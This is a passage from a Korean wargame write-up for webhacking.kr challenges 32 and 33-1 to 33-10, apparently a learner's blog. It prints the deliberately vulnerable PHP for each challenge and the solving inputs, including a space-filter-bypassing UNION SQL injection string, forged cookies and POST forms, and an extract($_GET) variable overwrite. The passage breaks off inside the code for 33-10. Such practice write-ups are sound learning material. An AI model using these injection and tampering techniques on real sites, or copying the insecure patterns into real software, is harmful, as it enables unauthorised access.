<span class="x">if($data[0]!=1 &amp;&amp; $data[0]!=2) { exit(); }</span>
</pre></div>

<ul>
<li><code>date[0]</code>가 2가 나오면 문제 해결.</li>
</ul>
<div class="codehilite"><pre><span></span><span class="x">if($data[0]==1)</span>
<span class="x">{</span>
<span class="x">echo(&quot;&lt;input type=button style=border:0;bgcolor=&#39;gray&#39; value=&#39;auth&#39; onclick=</span>
<span class="x">alert(&#39;Access_Denied!&#39;)&gt;&lt;p&gt;&quot;);</span>
<span class="x">echo(&quot;&lt;!-- admin mode : val=2 --&gt;&quot;);</span>
<span class="x">}</span>

<span class="x">if($data[0]==2)</span>
<span class="x">{</span>
<span class="x">echo(&quot;&lt;input type=button style=border:0;bgcolor=&#39;gray&#39; value=&#39;auth&#39; onclick=</span>
<span class="x">alert(&#39;Congratulation&#39;)&gt;&lt;p&gt;&quot;);</span>
<span class="x">@solve();</span>
<span class="x">}</span>
</pre></div>

<ul>
<li>주석대로 val에 union을 사용한다.</li>
<li><code>val = 1</code> 뒤에 <code>union select 2</code>을 써야하는데 <code>2</code>는 필터링 되므로 우회해야한다.</li>
<li>따라서, <code>val=1</code> 뒤에 <code>union SELECT (2</code> 입력</li>
<li><code>Access Denied!</code>라고 나온다. (어쩌란건지...)</li>
<li><code>2</code> 필터링을 피하기 위해 여러가지(삽질)을 시도한 결과</li>
<li><code>)union select(3-1</code> 입력</li>
<li>이번엔 <code>cannot use space</code>가 나온다. (...)</li>
<li><code>Space</code>를 우회해야한다는 건데...</li>
<li>URL인코딩표를 보면 (공백, space)<code>' '</code> = <code>%0A</code> 라는 것을 알 수 있다.</li>
<li>그래서 <code>var=1)%0Aunion%0Aselect%0A(3-1</code> 입력.</li>
<li><code>nice try</code>라고 잠깐 뜨고 초기화면이 나온다.(일단 좋은 시도라니깐 참고 진행)</li>
<li>이번엔 var=2로 변경해서 그대로 입력 <code>var=2)%0Aunion%0Aselect%0A(3-1</code></li>
<li>val=1과 같은 반응을 한다.</li>
<li>이번엔 val값을 0으로 해서 입력해보았다. (0이 제일 만만해서 넣은건 아님)</li>
<li><code>var=0)%0Aunion%0Aselect%0A(3-1</code> 입력</li>
<li>문제 해결</li>
</ul>
<h3 id="33">33번 문제<a class="headerlink" href="#33" title="Permanent link">&para;</a></h3>
<blockquote>
<p>필자 생각에, 이 문제는 끈기와 인내심을 요하는 문제인 것 같다.</p>
</blockquote>
<p>이 문제는 여러게의 작은 문제를 연속으로 풀어야 하는 문제다.
100~150 점 짜리 문제 10개 연속으로 푼다고 생각하면 된다.</p>
<h4 id="33-1">33-1<a class="headerlink" href="#33-1" title="Permanent link">&para;</a></h4>
<p>먼저 아래와 같은 내용의 페이지가 나온다.
<code>/challenge/bonus/bonus-6/index.phps</code> 를 클릭해보자.</p>
<blockquote>
<p>Challenge 33-1 <br />
/challenge/bonus/bonus-6/index.phps <br />
Wrong</p>
</blockquote>
<p>그러면 이 문제의 서버측 코드가 나온다.</p>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-1&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">get</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;hehe&quot;</span><span class="p">)</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=###&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Wrong&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>서버에 <code>GET</code> 메소드를 통해 <code>get</code> 이라는 키로 날라온 값이 <code>hehe</code> 이면 통과하는 것을 알 수 있다. <code>GET</code> 으로 값을 전달하려는 경우 보통 주소 뒤에 쿼리스트링을 붙여서 전달한다. 예제는 아래와 같다.</p>
<div class="codehilite"><pre><span></span> http:/exmaple.com?키1=값1&amp;키2=값2
</pre></div>

<p>따라서 주소 뒤에 <code>?get=hehe</code>를 붙여서 이동하면 문제가 풀린다.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/?get=hehe
</pre></div>

<h4 id="33-2">33-2<a class="headerlink" href="#33-2" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-2&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">post</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;hehe&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nx">post2</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;hehe2&quot;</span><span class="p">)</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=##&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Wrong&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>소스를 보면, POST 메소드로 키가 <code>post</code> 이고 값은 <code>hehe</code> 인 것과, 키가 <code>post2</code> 이고 값은 <code>hehe2</code> 인것이 오면 문제가 풀리는 것을 볼 수 있다. <code>POST</code> 메소드로 값을 전달하는 방법 중 하나는 HTML <code>form</code> 태그를 이용하는 것 이다. 다음과 같은 코드를 개발자 도구를 이용하여 페이지에 삽입하자. 문제가 요구하는 값을 가졌고, 버튼을 누르면 POST 메소드로 값을 보내는 폼이다. 삽입 후, 제출 버튼을 누르면 문제가 풀린다.</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;hehe&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;post2&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;hehe2&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>

<h4 id="33-3">33-3<a class="headerlink" href="#33-3" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-3&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">myip</span><span class="p">]</span><span class="o">==</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">])</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=##.php&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Wrong&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>GET 요청을 통해 온 <code>myip</code> 가 해당 요청을 클라이언트의 IP 주소와 같으면 풀리는 문제이다.
아래와 같이 주소 뒤에 <code>?myip=본인의_공인IP주소</code> 를 넣고 이동하면 풀린다.
본인의 공인 IP는 <a href="https://whatismyipaddress.com/">WhatIsMyIPAddress</a>등을 이용하면 알 수 있다.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/33.phps?myip=본인의_공인IP주소
</pre></div>

<h4 id="33-4">33-4<a class="headerlink" href="#33-4" title="Permanent link">&para;</a></h4>
<blockquote>
<p><del>여러분의 순발력을 시험하는 조금 거지같은 문제 되시겠다.</del></p>
</blockquote>
<p>이번 문제는 페이지 내용이 살짝 다른데, 아래와 같다.</p>
<blockquote>
<p>Challenge 33-4 <br />
/challenge/bonus/bonus-6/l4.phps <br />
hint : 1480253474</p>
</blockquote>
<p>일단 소스를 한번 보자.</p>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-4&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">password</span><span class="p">]</span><span class="o">==</span><span class="nb">md5</span><span class="p">(</span><span class="nb">time</span><span class="p">()))</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=###&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;hint : &quot;</span><span class="o">.</span><span class="nb">time</span><span class="p">());</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p><code>time()</code> 함수를 호출하여 얻은 현재 시각을 <code>md5</code> Hash 로 바꾼 값과, GET 요청으로 온 <code>password</code> 값이 일치하면 풀리는 문제이다. 풀리지 않는 경우, 그냥 현재 시각을 힌트로 페이지에 출력해준다. 페이지에 찍힌 <code>hint</code> 값에 20~30 정도 더해서 <code>md5</code> Hash 로 바꿔서 넣어보자. 순발력과 인내심으로 빠르게 변환하여 주소창에 넣고 이동을 몇번 반복하면 풀린다. 예제는 아래와 같다.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/l4.php?password=4f607be26614b5695bdfa8623c5c8e85
</pre></div>

<h4 id="33-5">33-5<a class="headerlink" href="#33-5" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-5&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">imget</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nx">impost</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="nx">imcookie</span><span class="p">])</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=###&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Wrong&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>소스를 보면, GET 요청으로 온 <code>imget</code>, POST 요청으로 온 <code>impost</code>, 쿠키값인 <code>imcookie</code> 가 모두 참이면 문제가 풀리는 것을 볼 수 있다. 어떻게 하면 GET, POST, Cookie 로 동시에 보낼 수 있을까? 생각보다 간단하다. <del>그러나 긔찮다.</del>
<code>imget</code> 값은 쿼리스트링, <code>impost</code> 값은 폼 태그 하나 삽입하고, 쿠키값은 개발자 콘솔의 콘솔 탭에서 수정하면 된다.
하나씩 해 보자.</p>
<p>먼저 주소창 뒤에 아래와 같이 쿼리스트링을 붙여 이동한다.<code>imget</code> 값을 <code>1</code> 로 하여 쿼리스트링으로 붙이는 것이다.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/md555.php?imget=1
</pre></div>

<p>그리고 다음과 같은 코드를 개발자 콘솔의 콘솔 탭에서 실행하여, 값이 <code>1</code> 인 쿠키, <code>imcookie</code> 를 만든다.</p>
<div class="codehilite"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s2">&quot;imcookie=1&quot;</span>
</pre></div>

<p>마지막으로 아래와 같은 코드를 페이지에 삽입하고, 제출 버튼을 누르면 풀린다.</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;impost&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>

<h4 id="33-6">33-6<a class="headerlink" href="#33-6" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-6&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="nx">test</span><span class="p">]</span><span class="o">==</span><span class="nb">md5</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$_SERVER[REMOTE_ADDR]</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nx">kk</span><span class="p">]</span><span class="o">==</span><span class="nb">md5</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$_SERVER[HTTP_USER_AGENT]</span><span class="s2">&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=###&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;hint : </span><span class="si">$_SERVER[HTTP_USER_AGENT]</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>소스코드를 보면, 클라이언트 주소를 <code>md5</code> 로 바꾼 값과 쿠키 중 <code>test</code> 의 값과 일치하고, POST 로 보낸 <code>kk</code> 가 클라이언트의 User Agent 를 <code>md5</code> 로 변환한 것과 일치하면 풀리는 것을 볼 수 있다. 풀리지 않는 경우, User Agent 값이 페이지에 찍히는 것을 알 수 있다.</p>
<p>먼저 쿠키값을 고쳐보자. 일단 본인의 공인 IP 를 <code>md5</code> 로 변환한 뒤, 다음과 같은 코드를 개발자 콘솔의 콘솔 탭에서 실행하면 된다.</p>
<div class="codehilite"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s2">&quot;test=59a74d2df97a0bc5fe49bf94f16cdf1c&quot;</span>
</pre></div>

<p>그리고 본인의 User Agent 값을 <code>md5</code> 로 변환한다. 놀랍게도 본인의 User Agent 값을 문제 페이지에서 친절하게 보여주고 있다. 필자의 경우, User Agent 는 <code>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36</code> 이다. 이를 <code>md5</code> 로 변환하고, 아래와 같은 폼 코드를 짜서 페이지에 삽입한다.</p>
<div class="codehilite"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;kk&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;adc50ddc21cf547721bc636b82e6dc05&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</pre></div>

<p>그리고 제출 버튼을 누르면 문제가 풀린다.</p>
<h4 id="33-7">33-7<a class="headerlink" href="#33-7" title="Permanent link">&para;</a></h4>
<p><div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-7&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>
<span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]);</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]]</span><span class="o">==</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">])</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=###&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Wrong&lt;br&gt;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">]]);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
GET을 통해 받은 것의 키가 본인의 공인 IP, 값도 본인의 IP 이면 문제가 풀림을 알 수 있다, 다만 점을 공백으로 대체하는 코드가 있는것을 보아, 점을 빼고 넣어주면 될 것 같다. 본인의 IP 가 <code>123.123.123.123</code> 이라면 <code>123123123123</code> 을 넣어주면 될 것 같다. 결론적으로 아래와 같이 주소 뒤에 붙여주면 된다.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/wtff.php?123123123123=123123123123
</pre></div>

<h4 id="33-8">33-8<a class="headerlink" href="#33-8" title="Permanent link">&para;</a></h4>
<blockquote>
<p><del>문제가 끝도 없다. 뷁.</del></p>
</blockquote>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-8&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="nb">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">addr</span><span class="p">])</span> <span class="nv">$addr</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$addr</span><span class="o">==</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">)</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=###&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Wrong&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>GET 요청으로 온 <code>addr</code> 값이 <code>127.0.0.1</code> 이면 문제가 풀린다. 만약에 <code>addr</code> 값이 비어 있으면 클라이언트의 IP 가 <code>addr</code> 에 저장되어 <code>127.0.0.1</code> 과 같은지 비교하는 것을 볼 수 있다. 다음과 같이 주소 뒤에 값을 붙여주면 문제가 풀린다.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/ipt.php?addr=127.0.0.1
</pre></div>

<h4 id="33-9">33-9<a class="headerlink" href="#33-9" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-9&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">97</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;=</span><span class="mi">122</span><span class="p">;</span><span class="nv">$i</span><span class="o">=</span><span class="nv">$i</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
<span class="p">{</span>
<span class="nv">$ch</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>

<span class="nv">$answer</span><span class="o">.=</span><span class="nv">$ch</span><span class="p">;</span>

<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">ans</span><span class="p">]</span><span class="o">==</span><span class="nv">$answer</span><span class="p">)</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;a href=###&gt;Next&lt;/a&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
<span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Wrong&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>소스코드를 보면, 반복문에서는 97 부터 시작하여 122 까지 홀수 인 숫자들을 아스키코드 표 상에서 대응하는 문자로 바꿔서(<a href="http://php.net/manual/kr/function.chr.php"><code>chr</code> 함수</a>), <code>answer</code> 변수의 저장된 문자열에 덧붙이는 것(<a href="http://php.net/manual/kr/language.operators.assignment.php"><code>.=</code> (할당연산자)</a>)을 볼 수 있다. 그리고 GET 요청을 통해 온 <code>ans</code> 가 반복문을 통해 만들어진 값과 같으면, 문제가 풀리는 것을 볼 수 있다.</p>
<p>일일이 아스키코드 표 보면서 값 알아내기 귀찮으므로, 다음과 같은 자바스크립트 코드를 콘솔에서 돌려보자.
그냥 아래 코드를 콘솔에 복붙하고 엔터키를 눌러보자.</p>
<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">answer</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">97</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;=</span><span class="mi">122</span><span class="p">;</span> <span class="nx">i</span><span class="o">+=</span><span class="mi">2</span><span class="p">){</span>
  <span class="nx">answer</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;ANSWER : &quot;</span><span class="o">+</span><span class="nx">answer</span><span class="p">);</span>
</pre></div>

<p>그럼 아래와 같은 결과가 나온다.</p>
<div class="codehilite"><pre><span></span>ANSWER : acegikmoqsuwy
</pre></div>

<p><code>ans</code> 의 값을 <code>acegikmoqsuwy</code> 로 보내주면 됨을 알 수 있다.</p>
<p>아래와 같이 주소 뒤에 붙여서 이동하자. 그러면 문제가 풀린다.</p>
<div class="codehilite"><pre><span></span>http://webhacking.kr/challenge/bonus/bonus-6/nextt.php?ans=acegikmoqsuwy
</pre></div>

<h4 id="33-10">33-10<a class="headerlink" href="#33-10" title="Permanent link">&para;</a></h4>
<p>일단은... Wrong! 이 없는 걸 보니 이게 마지막 인 것 같다.</p>
<div class="codehilite"><pre><span></span><span class="x">&lt;hr&gt;</span>
<span class="x">Challenge 33-10&lt;br&gt;</span>
<span class="x">&lt;script&gt;document.write(&quot;&lt;a href=http://webhacking.kr</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">PHP_SELF</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">s&lt;/a&gt;&quot;);&lt;/script&gt;</span>
<span class="x">&lt;hr&gt;</span>

<span class="cp">&lt;?</span>

<span class="nv">$ip</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nx">REMOTE_ADDR</span><span class="p">];</span>

